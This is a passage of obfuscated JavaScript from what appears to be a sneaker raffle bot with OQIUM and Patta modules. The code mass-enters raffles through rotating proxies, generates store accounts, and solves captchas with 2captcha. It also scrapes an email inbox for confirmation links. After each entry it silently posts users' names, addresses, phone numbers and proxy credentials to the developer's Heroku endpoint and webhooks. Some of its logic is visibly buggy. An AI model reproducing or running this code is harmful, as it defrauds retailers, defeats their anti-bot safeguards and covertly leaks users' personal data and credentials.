                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x26c985
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x22c014[_0x34cebe]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x255a87['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x1ad228
                                            }
                                        ]
                                    }], _0x4134c2 = { 'embeds': _0x5b4d1f }, _0x5199fa = _0x35ce92['data'], _0x5199fa['data']['attributes']['email'] = '' + _0x22c014[_0x34cebe]['Email'];
                                    if (_0x22c014[_0x34cebe]['Size'] == 'RANDOM') {
                                    }
                                    _0x5199fa['data']['attributes']['properties']['$first_name'] = '' + _0x22c014[_0x34cebe]['FirstName'], _0x5199fa['data']['attributes']['properties']['$last_name'] = '' + _0x22c014[_0x34cebe]['LastName'], _0x5199fa['data']['attributes']['properties']['$address1'] = _0x22c014[_0x34cebe]['Address1'] + '\x20' + _0x22c014[_0x34cebe]['Address2'] + '\x20' + _0x22c014[_0x34cebe]['HouseNumber'], _0x5199fa['data']['attributes']['properties']['$zip'] = '' + _0x22c014[_0x34cebe]['Zip'], _0x5199fa['data']['attributes']['properties']['$city'] = '' + _0x22c014[_0x34cebe]['City'], _0x5199fa['data']['attributes']['properties']['$country'] = '' + _0x22c014[_0x34cebe]['Country'], _0x22c014[_0x34cebe]['Size'] == 'RANDOM' ? _0x5199fa['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x522acc[_0x5407a8] : _0x5199fa['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x22c014[_0x34cebe]['Size'], _0x5199fa['data']['attributes']['properties']['$phone_number'] = '' + _0x22c014[_0x34cebe]['Phone'], _0x5199fa['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x22c014[_0x34cebe]['Follower'];
                                }
                                if (_0x255a87['useRandomProxy'] = ![])
                                    var _0x2abb2a = _0x5bc452[_0x34cebe]['split'](':');
                                else
                                    var _0x258f88 = Math['round'](Math['random']() * (_0x5bc452['length'] - 0x1)), _0x2abb2a = _0x5bc452[_0x258f88]['split'](':');
                                var _0x43c587 = {
                                    'jar': _0x337161,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x35ce92['url'],
                                    'headers': _0x35ce92['headers'],
                                    'body': JSON['stringify'](_0x5199fa),
                                    'proxy': 'http://' + _0x2abb2a[0x2] + ':' + _0x2abb2a[0x3] + '@' + _0x2abb2a[0x0] + ':' + _0x2abb2a[0x1]
                                };
                                return _0x3467d1 != 'ver' && (_0x43c587['url'] = _0x35ce92['url'], _0x43c587['headers'] = _0x35ce92['headers']), _0x3467d1 == 'ver' && (_0x43c587['method'] = 'GET'), new Promise(function (_0x27e0f5, _0x347bff) {
                                    callback = async (_0x1ad926, _0x297812, _0x212539) => {
                                        if (!_0x1ad926 && _0x297812['statusCode'] == 0xca || !_0x1ad926 && _0x297812['statusCode'] == 0xc8) {
                                            if (_0x3467d1 != 'ver') {
                                                var _0x104e3f = await _0x1523c9(_0x22c014[_0x34cebe], _0x35ce92, 'dev', ![]), _0x4ec157 = await _0x1523c9(_0x22c014[_0x34cebe], _0x35ce92, 'pub', ![]);
                                                const _0x33b0fe = {
                                                    'succesDEVMSG': { 'embeds': [_0x104e3f] },
                                                    'succesPUBMSG': { 'embeds': [_0x4ec157] }
                                                };
                                                let _0x1e742d = _0x22c014[_0x34cebe];
                                                try {
                                                    prxdata = {
                                                        'username': _0x26c985['replace']('#', ''),
                                                        'module': _0x35ce92['name'],
                                                        'entrydata': JSON['stringify'](_0x1e742d),
                                                        'proxy': '' + _0x5bc452[_0x34cebe]
                                                    };
                                                    var _0x93979a = JSON['stringify'](prxdata);
                                                    let _0x32745e = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x93979a, _0x32745e);
                                                } catch (_0x3e073f) {
                                                }
                                                if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                                                    try {
                                                        await _0xb6cfae(_0x255a87['webhook'], _0x33b0fe['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x33b0fe['succesDEVMSG']), await _0x4fda60(0xc8);
                                                try {
                                                    await _0xb6cfae(_0x5d80c9, _0x33b0fe['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x8bf342(_0x22c014[_0x34cebe], _0x35ce92);
                                            }
                                            _0x11133f--, _0x27e0f5(console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x35ce92['name'] + ']\x20Task\x20' + (_0x34cebe + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3467d1 != 'ver') {
                                                var _0x2f747f = '' + _0x1ad926, _0x3994f6 = await _0x1523c9(_0x22c014[_0x34cebe], _0x35ce92, 'dev', !![], _0x2f747f), _0x1cb7a8 = {};
                                                _0x1cb7a8['errorDEV'] = { 'embeds': [_0x3994f6] }, _0x2540d5(_0x22c014[_0x34cebe], _0x35ce92), _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x1cb7a8['errorDEV']), await _0xb6cfae(_0x991bd5, _0x1cb7a8['errorDEV']);
                                            }
                                            _0x11133f--, _0x347bff(console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x35ce92['name'] + ']\x20Task\x20' + (_0x34cebe + 0x1) + ':\x20' + _0x1ad926)));
                                        }
                                    };
                                    try {
                                        _0x3467d1 != 'ver' && console['log'](_0x46dcc5() + '\x20[' + _0x35ce92['name'] + ']\x20Task\x20' + (_0x34cebe + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5199fa['data']['attributes']['email']), _0x7b6702(_0x43c587, callback);
                                    } catch (_0x5ce5e7) {
                                        console['log'](_0x46dcc5() + '\x20Task\x20' + (_0x34cebe + 0x1) + ':\x20' + _0x5ce5e7);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1a55f7(_0x230a77, 'nor', _0x4f3f23, _0x2b256a, _0x444196), console['log'](_0x46dcc5() + '\x20[' + _0x4f3f23['name'] + ']\x20Sleeping\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                            } catch (_0x2dcc5c) {
                            }
                        }
                        _0x50e7f0(_0x2adbdc, _0x3b9b3f, _0x577e28, _0x395540), await _0x4fda60(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x8693a8, _0x43fd91, _0x31bce1) {
                    var _0x43fd91 = [], _0x2a378d = ![];
                    async function _0x28e872() {
                        var _0x4475fe = new _0x4ce16c({
                            'user': _0x255a87['masterMail'],
                            'password': _0x255a87['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4f90b2(_0x4d8607) {
                            _0x4475fe['openBox']('INBOX', ![], _0x4d8607);
                        }
                        _0x4475fe['once']('ready', function () {
                            _0x4f90b2(function (_0x3300d1, _0x370f81) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3300d1)
                                    throw _0x3300d1;
                                _0x4475fe['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x1c3686, _0x34305f) {
                                    if (!_0x34305f || !_0x34305f['length'])
                                        console['log'](_0x46dcc5() + '\x20[' + _0x8693a8['name'] + ']\x20No\x20mails\x20found'), _0x4475fe['end']();
                                    else {
                                        var _0x2c5c07 = _0x4475fe['seq']['fetch'](_0x34305f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2c5c07['on']('message', function (_0x1951d2, _0x5c5508) {
                                            var _0x1adb1f = '(#' + _0x5c5508 + ')\x20';
                                            _0x1951d2['on']('body', function (_0xd6e043, _0x38f81d) {
                                                _0x425966(_0xd6e043, (_0xb3c41f, _0x2456ad) => {
                                                    var _0x107698 = _0x2456ad['text']['split']('(')[0x1], _0x858e24 = _0x107698['split'](')')[0x0];
                                                    _0x43fd91['push'](_0x858e24);
                                                });
                                            }), _0x1951d2['once']('end', function () {
                                            });
                                        }), _0x2c5c07['once']('error', function (_0x2f2bba) {
                                            console['log']('Fetch\x20error:\x20' + _0x2f2bba), _0x2a378d = !![];
                                        }), _0x2c5c07['once']('end', function () {
                                            _0x4475fe['end'](), _0x2a378d = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x4475fe['once']('error', function (_0x5eeb4f) {
                            console['log'](_0x5eeb4f), _0x2a378d = !![];
                        }), _0x4475fe['once']('end', async function () {
                            _0x2a378d = !![];
                        }), _0x4475fe['connect']();
                    }
                    async function _0x4e3b0b(_0x59f293, _0x1d0c5a, _0x6e3c6) {
                        for (var _0x5ad5f0 = 0x0; _0x5ad5f0 < _0x1d0c5a['length']; _0x5ad5f0++) {
                            async function _0x12101c(_0x3ff92d, _0x24d5e4, _0x4a502c, _0x4ee4fa, _0x5e3808) {
                                var _0xded042, _0x23bde2 = {}, _0x2dbe00 = [], _0x21d3b8 = {}, _0x51896f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4c9158 = Math['round'](Math['random']() * (_0x51896f['length'] - 0x1));
                                _0x4ee4fa[_0x3ff92d]['Size'] == 'RANDOM' && (_0x4ee4fa[_0x3ff92d]['Size'] = _0x51896f[_0x4c9158]);
                                !_0x4ee4fa && (_0x4ee4fa = {});
                                if (_0x255a87['useRandomProxy'] = ![])
                                    var _0x229dcc = _0x5e3808[_0x3ff92d]['split'](':');
                                else
                                    var _0x3dad38 = Math['round'](Math['random']() * (_0x5e3808['length'] - 0x1)), _0x229dcc = _0x5e3808[_0x3dad38]['split'](':');
                                var _0x599218 = {
                                    'jar': _0x337161,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4a502c['url'],
                                    'headers': _0x4a502c['headers'],
                                    'body': JSON['stringify'](_0x23bde2),
                                    'proxy': 'http://' + _0x229dcc[0x2] + ':' + _0x229dcc[0x3] + '@' + _0x229dcc[0x0] + ':' + _0x229dcc[0x1]
                                };
                                return _0x24d5e4 == 'ver' && (_0x599218['method'] = 'GET', _0x599218['url'] = _0x4ee4fa[_0x3ff92d]), new Promise(function (_0x4f0756, _0x52e90a) {
                                    callback = async (_0xf3c07a, _0x30826c, _0x17344f) => {
                                        !_0xf3c07a && _0x30826c['statusCode'] == 0xca || !_0xf3c07a && _0x30826c['statusCode'] == 0xc8 ? _0x4f0756(console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x4a502c['name'] + ']\x20Task\x20' + (_0x3ff92d + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x52e90a(console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4a502c['name'] + ']\x20Task\x20' + (_0x3ff92d + 0x1) + ':\x20' + _0xf3c07a)));
                                    };
                                    try {
                                        _0x24d5e4 != 'ver' ? console['log'](_0x46dcc5() + '\x20[' + _0x4a502c['name'] + ']\x20Task\x20' + (_0x3ff92d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x23bde2['data']['attributes']['email']) : console['log'](_0x46dcc5() + '\x20[' + _0x4a502c['name'] + ']\x20Task\x20' + (_0x3ff92d + 0x1) + ':\x20Fetching\x20Response'), _0x7b6702(_0x599218, callback);
                                    } catch (_0x1ad9f6) {
                                        console['log'](_0x46dcc5() + '\x20Task\x20' + (_0x3ff92d + 0x1) + ':\x20' + _0x1ad9f6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x12101c(_0x5ad5f0, 'ver', _0x59f293, _0x1d0c5a, _0x6e3c6), console['log'](_0x46dcc5() + '\x20[' + _0x59f293['name'] + ']\x20Sleeping\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                            } catch (_0xa038fd) {
                                console['log'](_0xa038fd), await _0x4fda60(0x2710);
                            }
                        }
                    }
                    try {
                        _0x28e872();
                        while (!_0x2a378d) {
                            await _0x4fda60(0xfa0);
                        }
                        console['log']('Found\x20' + _0x43fd91['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x22c37f) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x22c37f), await _0x4fda60(0x2710);
                    }
                    try {
                        await _0x4e3b0b(_0x8693a8, _0x43fd91, _0x31bce1);
                    } catch (_0x5ef4e8) {
                        console['log'](_0x5ef4e8), await _0x4fda60(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x57e536, _0x2b4ba7, _0x90eb92) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x505d0c = 0x0; _0x505d0c < _0x2b4ba7['length']; _0x505d0c++) {
                        var _0xe6cf2d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x26c985
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x255a87['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1ad228
                                }
                            ]
                        }];
                        const _0x52632d = { 'embeds': _0xe6cf2d };
                        _0xf5e41e(_0x57e536['name'] + '\x20Task\x20' + (_0x505d0c + 0x1) + '\x20/\x20' + _0x2b4ba7['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        try {
                            await _0x436f00(_0x2b4ba7, _0x505d0c);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3ed504 = await _0x1523c9(_0x2b4ba7[_0x505d0c], _0x57e536, 'acc', ![]);
                        const _0x592506 = { 'succesDEVMSG': { 'embeds': [_0x3ed504] } };
                        if (_0x2b4ba7[_0x505d0c]['Email'] == '' || _0x2b4ba7[_0x505d0c]['FirstName'] == '' || _0x2b4ba7[_0x505d0c]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4fda60(0x7d0);
                            continue;
                        }
                        (_0x2b4ba7[_0x505d0c]['Password'] == '' || _0x2b4ba7[_0x505d0c] == undefined) && _0x2b4ba7[_0x505d0c]['Password'] == 'JRaffles23!';
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x382b44 = _0x90eb92[_0x505d0c]['split'](':');
                        else
                            var _0x5e6158 = Math['round'](Math['random']() * (_0x90eb92['length'] - 0x1)), _0x382b44 = _0x90eb92[_0x5e6158]['split'](':');
                        var _0xc5c2b1;
                        try {
                            _0xc5c2b1 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x382b44[0x0] + ':' + _0x382b44[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc5c2b1 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x382b44[0x0] + ':' + _0x382b44[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x48139b = await _0xc5c2b1['newPage']();
                            await _0x48139b['authenticate']({
                                'username': '' + _0x382b44[0x2],
                                'password': '' + _0x382b44[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x57e536['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48139b['setRequestInterception'](!![]), _0x48139b['on']('request', _0x3316a0 => {
                                _0x3316a0['resourceType']() === 'image' || _0x3316a0['resourceType']() === 'font' || _0x3316a0['resourceType']() === 'media' ? _0x3316a0['abort']() : _0x3316a0['continue']();
                            }), await _0x48139b['goto']('https://patta.nl/account/register'), await _0x4fda60(0xbb8), await _0x48139b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x46dcc5() + '\x20[' + _0x57e536['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Filling\x20information'), await _0x48139b['type']('#RegisterForm-FirstName', '' + _0x2b4ba7[_0x505d0c]['FirstName']), await _0x4fda60(0x226), await _0x48139b['type']('#RegisterForm-LastName', '' + _0x2b4ba7[_0x505d0c]['LastName']), await _0x4fda60(0x226), await _0x48139b['type']('#RegisterForm-email', '' + _0x2b4ba7[_0x505d0c]['Email']), await _0x4fda60(0x226), await _0x48139b['type']('#RegisterForm-password', '' + _0x2b4ba7[_0x505d0c]['Password']), await _0x4fda60(0x226), console['log'](_0x46dcc5() + '\x20[' + _0x57e536['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Submitting..'), await _0x48139b['$eval']('#RegisterForm', _0x34629e => _0x34629e['submit']()), await _0x4fda60(0x1f40);
                            try {
                                await _0x48139b['waitForSelector']('.home-page-grid__collection'), await _0x4fda60(0x1f4), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x57e536['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Account\x20' + _0x2b4ba7[_0x505d0c]['Email'] + '\x20Generated!')), _0x147d24['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x2b4ba7[_0x505d0c]['Email'] + ',' + _0x2b4ba7[_0x505d0c]['Password']), console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x57e536['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Account\x20' + _0x2b4ba7[_0x505d0c]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x592506['succesDEVMSG']);
                                } catch {
                                }
                                await _0xb6cfae(_0xc2690c, _0x592506['succesDEVMSG']);
                            } catch (_0x327602) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x327602));
                            }
                        } catch (_0x4e457c) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x505d0c + 0x1) + '\x20:\x20' + _0x4e457c));
                        } finally {
                            _0xc5c2b1 && _0xc5c2b1['close'](), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x9d61ee, _0x2fa1e2, _0x3dcdb3) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x323b7f = 0x0; _0x323b7f < _0x2fa1e2['length']; _0x323b7f++) {
                        var _0x5e0907;
                        if (_0x23eaeb != 'yes')
                            var _0x23eaeb = '', _0x52735c = 0x0;
                        _0xf5e41e(_0x9d61ee['name'] + '\x20Task\x20' + (_0x323b7f + 0x1) + '\x20/\x20' + _0x2fa1e2['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        try {
                            await _0x436f00(_0x2fa1e2, _0x323b7f);
                        } catch {
                            _0x23eaeb = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2fa1e2[_0x323b7f]['Email'] == '' || _0x2fa1e2[_0x323b7f]['Password'] == '' || _0x2fa1e2[_0x323b7f]['FirstName'] == '' || _0x2fa1e2[_0x323b7f]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0xa711d8 = _0x3dcdb3[_0x323b7f]['split'](':');
                        else
                            var _0x3ebac0 = Math['round'](Math['random']() * (_0x3dcdb3['length'] - 0x1)), _0xa711d8 = _0x3dcdb3[_0x3ebac0]['split'](':');
                        var _0x37fb61;
                        try {
                            _0x37fb61 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa711d8[0x0] + ':' + _0xa711d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x37fb61 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa711d8[0x0] + ':' + _0xa711d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xaa5eb8 = await _0x37fb61['newPage']();
                            await _0xaa5eb8['authenticate']({
                                'username': '' + _0xa711d8[0x2],
                                'password': '' + _0xa711d8[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Getting\x20Session'), await _0xaa5eb8['setRequestInterception'](!![]), _0xaa5eb8['on']('request', _0x39e3c3 => {
                                _0x39e3c3['resourceType']() === 'image' || _0x39e3c3['resourceType']() === 'font' || _0x39e3c3['resourceType']() === 'media' ? _0x39e3c3['abort']() : _0x39e3c3['continue']();
                            }), await _0xaa5eb8['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xaa5eb8['waitForSelector']('#CustomerEmail'), console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Logging\x20in..'), await _0xaa5eb8['type']('#CustomerEmail', '' + _0x2fa1e2[_0x323b7f]['Email']), await _0x4fda60(0x12c), await _0xaa5eb8['type']('#CustomerPassword', '' + _0x2fa1e2[_0x323b7f]['Password']), await _0x4fda60(0x226), await _0xaa5eb8['$eval']('#customer_login', _0x13ffe9 => _0x13ffe9['submit']());
                            try {
                                await _0xaa5eb8['waitForSelector']('#orders'), await _0x4fda60(0x4b0);
                            } catch {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xaa5eb8['goto']('' + _0x2fa1e2[_0x323b7f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4fda60(0xbb8), console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xaa5eb8['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xaa5eb8['type']('#email', '' + _0x2fa1e2[_0x323b7f]['Email']), await _0x4fda60(0x384), await _0xaa5eb8['type']('#first_name', '' + _0x2fa1e2[_0x323b7f]['FirstName']), await _0x4fda60(0x514), await _0xaa5eb8['type']('#last_name', '' + _0x2fa1e2[_0x323b7f]['LastName']), await _0x4fda60(0x514), await _0xaa5eb8['type']('#street_address', _0x2fa1e2[_0x323b7f]['Address1'] + '\x20' + _0x2fa1e2[_0x323b7f]['HouseNumber'] + '\x20' + _0x2fa1e2[_0x323b7f]['Address2']), await _0x4fda60(0x2bc);
                            _0x2fa1e2[_0x323b7f]['Postcode'] == undefined && (_0x2fa1e2[_0x323b7f]['Postcode'] = _0x2fa1e2[_0x323b7f]['Zip']);
                            await _0xaa5eb8['type']('#zip_code', '' + _0x2fa1e2[_0x323b7f]['Postcode']), await _0x4fda60(0x320), await _0xaa5eb8['type']('#city', '' + _0x2fa1e2[_0x323b7f]['City']), await _0x4fda60(0x320), await _0xaa5eb8['type']('#bday', '01/01/1994'), await _0x4fda60(0x320), await _0xaa5eb8['type']('#instagram', '' + _0x2fa1e2[_0x323b7f]['Follower']), await _0x4fda60(0x352);
                            if (_0x2fa1e2[_0x323b7f]['Size'] == 'RANDOM') {
                                const _0xcbfe2b = await _0xaa5eb8['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2b91ac => {
                                    return _0x2b91ac['map'](_0x2ed56b => _0x2ed56b['textContent']);
                                });
                                var _0x5549e3 = Math['round'](Math['random']() * (_0xcbfe2b['length'] - 0x1));
                                console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0xcbfe2b[_0x5549e3]), await _0xaa5eb8['click']('label[data-eu-size=\x22' + _0xcbfe2b[_0x5549e3] + '\x22]');
                            } else {
                                console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2fa1e2[_0x323b7f]['Size']);
                                try {
                                    await _0xaa5eb8['click']('label[data-eu-size=\x22' + _0x2fa1e2[_0x323b7f]['Size'] + '\x22]');
                                } catch {
                                    await _0xaa5eb8['click']('label[data-eu-size=\x22' + _0x2fa1e2[_0x323b7f]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x4fda60(0xbb8), await _0xaa5eb8['$$eval']('.raffle__checkbox-label', _0x1fece8 => _0x1fece8['forEach'](_0x1ded30 => _0x1ded30['click']())), await _0x4fda60(0x7d0), console['log'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xaa5eb8['click']('#raffle__form-submit'), await _0x4fda60(0x1388);
                            try {
